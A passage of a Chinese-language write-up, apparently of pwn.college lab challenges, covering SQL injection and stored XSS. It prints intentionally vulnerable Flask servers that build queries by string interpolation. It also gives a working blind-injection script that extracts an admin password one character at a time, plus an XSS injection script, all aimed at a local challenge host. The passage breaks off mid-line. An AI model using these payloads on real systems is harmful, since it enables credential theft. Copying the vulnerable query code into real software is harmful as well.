tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 连接到SQLite数据库并执行SQL查询</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 使用Row工厂，使返回结果可以通过列名访问</span></span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)  <span class="comment"># 执行SQL语句</span></span><br><span class="line">        connection.commit()  <span class="comment"># 提交更改</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回查询结果</span></span><br><span class="line"></span><br><span class="line">db = TemporaryDB()  <span class="comment"># 创建TemporaryDB实例，用于执行SQL查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_createtable.html</span></span><br><span class="line"><span class="comment"># 随机生成一个用户表名</span></span><br><span class="line">user_table = <span class="string">f&quot;users_<span class="subst">&#123;random.randrange(<span class="number">2</span>**<span class="number">32</span>, <span class="number">2</span>**<span class="number">33</span>)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个包含 `admin` 用户的表，表名是随机生成的，并将 flag 作为密码插入</span></span><br><span class="line">db.execute(<span class="string">f&quot;&quot;&quot;CREATE TABLE <span class="subst">&#123;user_table&#125;</span> AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入一个名为 `guest` 的用户，密码为 `password`</span></span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_insert.html</span></span><br><span class="line">db.execute(<span class="string">f&quot;&quot;&quot;INSERT INTO <span class="subst">&#123;user_table&#125;</span> SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    <span class="comment"># 从GET请求的参数中获取 `query`，默认值为 `%`，用于模糊匹配所有用户名</span></span><br><span class="line">    query = flask.request.args.get(<span class="string">&quot;query&quot;</span>, <span class="string">&quot;%&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构造SQL查询，从随机生成的用户表中查询符合条件的用户名</span></span><br><span class="line">        <span class="comment"># https://www.sqlite.org/schematab.html</span></span><br><span class="line">        <span class="comment"># https://www.sqlite.org/lang_select.html</span></span><br><span class="line">        sql = <span class="string">f&#x27;SELECT username FROM <span class="subst">&#123;user_table&#125;</span> WHERE username LIKE &quot;<span class="subst">&#123;query&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)  <span class="comment"># 打印调试信息，输出构造的SQL查询</span></span><br><span class="line">        <span class="comment"># 执行查询并将结果拼接成字符串返回</span></span><br><span class="line">        results = <span class="string">&quot;\n&quot;</span>.join(user[<span class="string">&quot;username&quot;</span>] <span class="keyword">for</span> user <span class="keyword">in</span> db.execute(sql).fetchall())</span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果SQL查询出错，返回错误信息</span></span><br><span class="line">        results = <span class="string">f&quot;SQL error: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回一个包含查询表单、查询SQL语句（表名被替换为“REDACTED”以隐藏）、查询结果的HTML页面</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;Welcome to the user query service!</span></span><br><span class="line"><span class="string">        &lt;form&gt;Query:&lt;input type=text name=query value=&#x27;<span class="subst">&#123;query&#125;</span>&#x27;&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Query:&lt;/b&gt; &lt;pre&gt;<span class="subst">&#123;sql.replace(user_table, <span class="string">&quot;REDACTED&quot;</span>)&#125;</span>&lt;/pre&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Results:&lt;/b&gt;&lt;pre&gt;<span class="subst">&#123;results&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机的Flask会话密钥</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置服务器名称</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Flask应用程序，监听challenge.localhost的80端口</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-13-SQLi-5"><a href="#3-13-SQLi-5" class="headerlink" title="3.13 SQLi 5"></a>3.13 SQLi 5</h3><p>这个题要实现一个盲注<code>blind injection</code>。具体来说，是构造查询<code>SELECT rowid, * FROM users WHERE username = &quot;admin&quot; AND substr(password, 1, 1) = &#39;a&#39; -- &quot; AND password = &quot;anything&quot;</code>来匹配密码的每一个字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要构造的盲注 payload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sql_injection_payload</span>(<span class="params">char_position, char_value</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;admin\&quot; AND SUBSTR(password,<span class="subst">&#123;char_position&#125;</span>,1) = \&quot;<span class="subst">&#123;char_value&#125;</span>\&quot; -- &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于执行盲注并检查响应</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_char_from_password</span>(<span class="params">char_position</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string.printable:</span><br><span class="line">        char_value = char</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构造 SQL 注入负载</span></span><br><span class="line">        payload = blind_sql_injection_payload(char_position, char_value)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 发送请求</span></span><br><span class="line">        response = requests.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;anything&quot;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果密码匹配，收到一个 302 重定向的响应（假设是成功登录的标志）</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">302</span> <span class="keyword">or</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found character at position <span class="subst">&#123;char_position&#125;</span>: <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> char</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 可选：延时，防止请求太快被检测到（增加盲注的隐蔽性）</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取整个密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password</span>():</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    char_position = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 假设密码长度为 60（根据您的要求）</span></span><br><span class="line">    <span class="keyword">while</span> char_position &lt;= <span class="number">60</span>:</span><br><span class="line">        char = get_char_from_password(char_position)</span><br><span class="line">        <span class="keyword">if</span> char:</span><br><span class="line">            password += char</span><br><span class="line">            char_position += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主程序</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting to retrieve password...&quot;</span>)</span><br><span class="line">    password = get_password()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Retrieved password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>server代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)  <span class="comment"># 创建Flask应用程序实例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件，后缀为 `.db`</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 连接到SQLite数据库并执行SQL查询</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 使结果集以字典的形式返回</span></span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)  <span class="comment"># 执行SQL查询并传入参数</span></span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result  <span class="comment"># 返回查询结果</span></span><br><span class="line"></span><br><span class="line">db = TemporaryDB()  <span class="comment"># 创建TemporaryDB实例，用于执行SQL查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_createtable.html</span></span><br><span class="line"><span class="comment"># 创建名为 `users` 的表，包含一条记录，用户名为 `admin`，密码从 `/flag` 文件中读取</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()])</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_insert.html</span></span><br><span class="line"><span class="comment"># 向 `users` 表中插入第二条记录，用户名为 `guest`，密码为 `password`</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理POST请求，用户通过表单提交用户名和密码进行登录</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 获取表单中的 `username` 和 `password` 参数</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果表单缺少 `username` 或 `password` 参数，返回 400 错误</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># https://www.sqlite.org/lang_select.html</span></span><br><span class="line">        <span class="comment"># 查询数据库，检查 `username` 和 `password` 是否匹配</span></span><br><span class="line">        query = <span class="string">f&#x27;SELECT rowid, * FROM users WHERE username = &quot;<span class="subst">&#123;username&#125;</span>&quot; AND password = &quot;<span class="subst">&#123;password&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)  <span class="comment"># 打印调试信息，输出SQL查询语句</span></span><br><span class="line">        user = db.execute(query).fetchone()  <span class="comment"># 执行查询并获取结果</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果SQL查询出错，返回500错误，并显示SQL错误信息</span></span><br><span class="line">        flask.abort(<span class="number">500</span>, <span class="string">f&quot;Query: <span class="subst">&#123;query&#125;</span>\nError: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果没有找到匹配的用户，返回403错误，表示登录失败</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果登录成功，将用户名存储在会话中</span></span><br><span class="line">    flask.session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)  <span class="comment"># 重定向到当前路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理GET请求，显示登录表单或欢迎页面</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 检查用户是否已经登录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.session.get(<span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        <span class="comment"># 如果用户没有登录，显示登录表单</span></span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果用户已登录，显示欢迎信息</span></span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 显示登录表单</span></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;Pass:&lt;input type=text name=password&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机的Flask会话密钥</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置服务器名称，监听在 challenge.localhost:80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Flask应用程序，监听 challenge.localhost 的80端口</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-14-XSS-1"><a href="#3-14-XSS-1" class="headerlink" title="3.14 XSS 1"></a>3.14 XSS 1</h3><p>这个挑战是实现一个存储型XSS攻击，通过victim代码我们知道，获取flag需要在get到的数据中有3个<code>&lt;input&gt; textbox</code>、所以我们需要通过server的post方法注入3个<code>&lt;input&gt; textbox</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST 数据，注入三个输入框</span></span><br><span class="line">data = &#123;<span class="string">&quot;content&quot;</span>: <span class="string">&quot;&lt;input type=&#x27;text&#x27;&gt;&lt;input type=&#x27;text&#x27;&gt;&lt;input type=&#x27;text&#x27;&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Payload injected successfully!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to inject payload.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>server代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row</span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"><span class="comment"># 创建一个初始的表格和数据</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT &quot;First Post!&quot; AS content&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    content = flask.request.form.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)  <span class="comment"># 获取表单中的内容</span></span><br><span class="line">    db.execute(<span class="string">&quot;INSERT INTO posts VALUES (?)&quot;</span>, [content])  <span class="comment"># 将内容存储到数据库中</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.request.path)  <span class="comment"># 提交后刷新页面</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, the anonymous posting service. Post away!\n&quot;</span></span><br><span class="line">    page += <span class="string">&quot;&lt;form method=post&gt;Post:&lt;input type=text name=content&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从数据库中获取所有的帖子内容并显示</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> db.execute(<span class="string">&quot;SELECT content FROM posts&quot;</span>).fetchall():</span><br><span class="line">        page += <span class="string">&quot;&lt;hr&gt;&quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;\n&quot;</span>  <span class="comment"># 显示帖子的内容（潜在的XSS漏洞）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Flask应用的密钥和服务器名称</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>victim代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入用于发送 HTTP 请求的 requests 库</span></span><br><span class="line"><span class="keyword">import</span> psutil    <span class="comment"># 导入用于查看系统状态和进程信息的 psutil 库</span></span><br><span class="line"><span class="keyword">import</span> sys       <span class="comment"># 导入系统级的库，用于退出程序等</span></span><br><span class="line"><span class="keyword">import</span> re        <span class="comment"># 导入正则表达式库，用于匹配和操作字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有当前监听的端口（IPv4类型）</span></span><br><span class="line">open_ports = &#123; s.laddr.port <span class="keyword">for</span> s <span class="keyword">in</span> psutil.net_connections(kind=<span class="string">&quot;inet&quot;</span>) <span class="keyword">if</span> s.status == <span class="string">&#x27;LISTEN&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 80 端口没有在监听，表示服务没有运行，程序退出</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">80</span> <span class="keyword">not</span> <span class="keyword">in</span> open_ports:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Service doesn&#x27;t seem to be running?&quot;</span>)  <span class="comment"># 输出错误信息</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)  <span class="comment"># 退出程序，状态码为1表示有错误发生</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置挑战的 URL，假设服务运行在本地的 80 端口</span></span><br><span class="line">challenge_url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取存储在 /flag 文件中的 flag 内容</span></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read().strip()  <span class="comment"># 读取 flag 